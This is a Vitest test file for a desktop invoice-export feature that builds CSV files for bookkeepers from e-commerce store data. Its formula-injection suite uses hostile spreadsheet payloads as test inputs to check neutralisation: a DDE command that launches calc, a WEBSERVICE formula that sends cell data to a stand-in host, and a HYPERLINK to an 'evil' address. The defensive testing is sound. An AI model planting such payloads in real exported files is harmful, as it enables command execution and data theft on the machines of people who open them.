import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import { INVOICE_COLUMNS } from '@shared/constants/invoice'
import { buildInvoiceCsv, ensureCsvExtension, escapeCsvCell, invoiceCsvRows } from '@shared/invoice-csv'

function row(overrides: any = {}) {
  return {
    storeName: '验A店',
    platform: '抖店',
    licenseName: '上海某某贸易有限公司',
    licenseNo: '91310000MA1FL1234X',
    sections: [
      {
        name: '我给平台开票',
        items: [{ cells: { id: '28351275426', amount: '¥14.89' }, extras: [{ label: '账单信息', value: '3笔订单' }] }]
      }
    ],
    ...overrides
  }
}

describe('发票导出 CSV 的行组装', () => {
  it('带「营业执照 / 统一社会信用代码」两列，且排在店铺/平台之后（代账按主体分账要用）', () => {
    const rows = invoiceCsvRows([row()], INVOICE_COLUMNS)
    expect(Object.keys(rows[0]).slice(0, 5)).toEqual(['店铺', '平台', '营业执照', '统一社会信用代码', '开票方向'])
    expect(rows[0]['营业执照']).toBe('上海某某贸易有限公司')
    expect(rows[0]['统一社会信用代码']).toBe('91310000MA1FL1234X')
  })

  it('没填营业执照的店写「未填写」，不是空字符串（留空和"漏导出"看不出区别）', () => {
    const rows = invoiceCsvRows([row({ licenseName: null, licenseNo: null })], INVOICE_COLUMNS)
    expect(rows[0]['营业执照']).toBe('未填写')
    expect(rows[0]['统一社会信用代码']).toBe('')
  })

  it('只填了代码的店，营业执照列显示代码（否则那一行看起来像没填主体）', () => {
    const rows = invoiceCsvRows([row({ licenseName: null })], INVOICE_COLUMNS)
    expect(rows[0]['营业执照']).toBe('91310000MA1FL1234X')
  })

  it('每个方向单独出行，统一列按 INVOICE_COLUMNS 顺序展开，未映射的列进「其他信息」', () => {
    const rows = invoiceCsvRows([row({
      sections: [
        { name: '我给平台开票', items: [{ cells: { id: 'A1', amount: '¥1.00' }, extras: [] }] },
        { name: '平台给我开票', items: [{ cells: { id: 'B1', amount: '¥2.00' }, extras: [{ label: '账期', value: '2026年05月' }] }] }
      ]
    })], INVOICE_COLUMNS)
    expect(rows).toHaveLength(2)
    expect(rows.map(r => r['开票方向'])).toEqual(['我给平台开票', '平台给我开票'])
    expect(rows[1]['单号/账单号']).toBe('B1')
    expect(rows[1]['其他信息']).toBe('账期：2026年05月')
  })

  it('没有行时返回空数组（导出侧据此报"没有可导出的数据"）', () => {
    expect(invoiceCsvRows([], INVOICE_COLUMNS)).toEqual([])
    expect(invoiceCsvRows([row({ sections: [] })], INVOICE_COLUMNS)).toEqual([])
  })

  // B2（2026-10-14）：导出里同时含"待开票"与"无需操作"（已提交/已通过）的行，
  // 而文件名与界面合计都叫"待开票"——没有这一列，代账会把已提交的账单再算一遍。
  it('带「是否待办」列且放在最后（不动代账已经习惯的前 14 列顺序）', () => {
    const rows = invoiceCsvRows([row({
      sections: [
        { name: '给平台开票（未开票账单）', items: [{ cells: { id: 'A1' }, extras: [] }] },
        { name: '开票处理记录', pending: false, items: [{ cells: { id: 'B1' }, extras: [] }] }
      ]
    })], INVOICE_COLUMNS)
    const keys = Object.keys(rows[0])
    expect(keys[keys.length - 1]).toBe('是否待办')
    expect(rows[0]['是否待办']).toBe('待开票')
    expect(rows[1]['是否待办']).toBe('无需操作')
    // 前 5 列仍是店铺/平台/营业执照/统一社会信用代码/开票方向
    expect(keys.slice(0, 5)).toEqual(['店铺', '平台', '营业执照', '统一社会信用代码', '开票方向'])
  })

  it('没标 pending 的方向按待办算（与界面口径一致：pending 缺省为 true）', () => {
    const rows = invoiceCsvRows([row({ sections: [{ name: '订单开票', items: [{ cells: { id: 'A1' }, extras: [] }] }] })], INVOICE_COLUMNS)
    expect(rows[0]['是否待办']).toBe('待开票')
  })
})

describe('发票导出 CSV 文本', () => {
  it('带 UTF-8 BOM 与 CRLF 换行（BOM 少一次 Excel 中文乱码，实测踩过）', () => {
    const csv = buildInvoiceCsv(invoiceCsvRows([row()], INVOICE_COLUMNS))
    expect(csv.startsWith('\uFEFF')).toBe(true)
    expect(csv).toContain('\r\n')
    expect(csv.split('\r\n')[0].replace('\uFEFF', '').split(',')[0]).toBe('店铺')
  })

  it('含逗号/引号/换行的值被正确转义（拼多多订单号带换行）', () => {
    const csv = buildInvoiceCsv(invoiceCsvRows([row({
      storeName: '验,A店',
      sections: [{ name: '订单开票', items: [{ cells: { id: '220630-4018\n逾期未开票', amount: '¥1.00' }, extras: [] }] }]
    })], INVOICE_COLUMNS))
    expect(csv).toContain('"验,A店"')
    expect(csv).toContain('"220630-4018\n逾期未开票"')
  })

  it('表头顺序与行组装一致（列顺序由 invoiceCsvRows 决定）', () => {
    const data = invoiceCsvRows([row()], INVOICE_COLUMNS)
    const header = buildInvoiceCsv(data).split('\r\n')[0].replace('\uFEFF', '').split(',')
    expect(header).toEqual(Object.keys(data[0]))
  })

  // 2026-10-14 审查 P1-1：这份表是给代账用 Excel/WPS 打开的，而抬头/税号是**买家在平台上填的**。
  describe('公式注入中和', () => {
    it('= + @ 与制表符/回车开头的值加前导单引号（DDE / WEBSERVICE 型载荷）', () => {
      expect(escapeCsvCell("=cmd|'/c calc'!A0")).toBe("'=cmd|'/c calc'!A0")
      // 含引号的值会再套一层 CSV 引号，但中和一定发生在最前面
      expect(escapeCsvCell('=WEBSERVICE("https://x/"&A2)')).toContain("'=WEBSERVICE")
      expect(escapeCsvCell('+1+1')).toBe("'+1+1")
      expect(escapeCsvCell('@SUM(1)')).toBe("'@SUM(1)")
      expect(escapeCsvCell('\t=1+1')).toBe("'\t=1+1")
      // 含 \r 的值会被 CSV 引号包起来，剥掉最外层引号后仍是"前缀在公式字符之前"
      expect(escapeCsvCell('\r=1+1').replace(/^"/, '')).toMatch(/^'\r/)
    })

    it('负数金额**不动**（退款/冲正的 -12.50 加了前缀，代账求和就废了）', () => {
      expect(escapeCsvCell('-12.50')).toBe('-12.50')
      expect(escapeCsvCell('-0.01')).toBe('-0.01')
      expect(escapeCsvCell('-1234')).toBe('-1234')
    })

    it('减号开头但不是纯数字的仍要中和（避免 -1+1 这类被当公式）', () => {
      expect(escapeCsvCell('-1+1')).toBe("'-1+1")
      expect(escapeCsvCell('-cmd|calc')).toMatch(/^'-/)
    })

    it('普通中文/数字/带逗号的值行为不变（只多一层公式中和）', () => {
      expect(escapeCsvCell('上海某某贸易有限公司')).toBe('上海某某贸易有限公司')
      expect(escapeCsvCell('28351275426')).toBe('28351275426')
      expect(escapeCsvCell('a,b')).toBe('"a,b"')
      expect(escapeCsvCell('说"明"')).toBe('"说""明"""')
    })

    it('整条 CSV 里买家填的抬头被中和（端到端：行组装 → 文本）', () => {
      const csv = buildInvoiceCsv(invoiceCsvRows([row({
        sections: [{ name: '订单开票', items: [{ cells: { title: '=HYPERLINK("https://evil/")' }, extras: [] }] }]
      })], INVOICE_COLUMNS))
      expect(csv).toContain("'=HYPERLINK")
      // 单元格开头（行首或逗号后）不能再出现裸露的 =
      expect(csv).not.toMatch(/(?:^|,|\r\n)=HYPERLINK/)
    })
  })
})

// 2026-10-15 审查 C6：保存框不强制扩展名 / 写盘失败无审计——两处都在这里钉住
describe('导出路径补全（C6）', () => {
  it('不是 .csv 结尾就补上；已有 .csv（大小写不敏感）原样保留', () => {
    expect(ensureCsvExtension('C:\\导出\\待开票清单')).toBe('C:\\导出\\待开票清单.csv')
    expect(ensureCsvExtension('C:\\导出\\报表.txt')).toBe('C:\\导出\\报表.txt.csv')
    expect(ensureCsvExtension('D:/x/清单.CSV')).toBe('D:/x/清单.CSV')
  })
})

describe('导出落盘（主进程 handler 的防呆，C6）', () => {
  const HANDLER = readFileSync(resolve('apps/desktop/src/main/ipc/profile-misc-handlers.ts'), 'utf8')

  it('路径必须经 ensureCsvExtension 补全，写盘与返回都用补过名的路径', () => {
    expect(HANDLER).toContain('ensureCsvExtension(res.filePath)')
    expect(HANDLER).toContain("writeFileSync(filePath, csv, 'utf8')")
    expect(HANDLER).not.toContain('writeFileSync(res.filePath, csv')
    expect(HANDLER).toContain('return success({ path: filePath,')
  })

  it('写盘失败写 failure 审计并如实报错（不再只回 INTERNAL_ERROR、不留痕）', () => {
    expect(HANDLER).toContain("writeAudit('invoice.export', 'failure'")
    expect(HANDLER).toMatch(/写入文件失败/)
  })
})
